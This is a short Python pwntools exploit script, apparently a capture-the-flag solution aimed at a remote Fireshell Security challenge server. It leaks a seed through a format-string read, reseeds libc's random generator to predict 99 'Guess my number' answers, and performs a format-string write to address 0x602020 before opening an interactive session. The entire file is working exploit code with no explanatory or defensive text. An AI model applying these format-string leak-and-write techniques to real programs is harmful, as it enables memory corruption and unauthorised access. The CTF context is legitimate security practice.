from pwn import *
from ctypes import cdll
context.log_level = "debug"
p = remote("challs.fireshellsecurity.team" , 31006)
payload = "%8$p"
p.sendafter("What is your name? " , payload)
p.recvuntil("Welcome ")
seed = eval(p.recvuntil("\n" , drop = True)) & 0xffffffff
p.close()
seed += 3
libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc-2.23.so")
libc.srand(seed)

p = remote("challs.fireshellsecurity.team" , 31006)
payload = "aaa%11$n" + p64(0x602020)
p.sendafter("What is your name? " , payload)
for i in range(99):
	p.sendlineafter("Guess my number: " , str(libc.rand()))
p.interactive()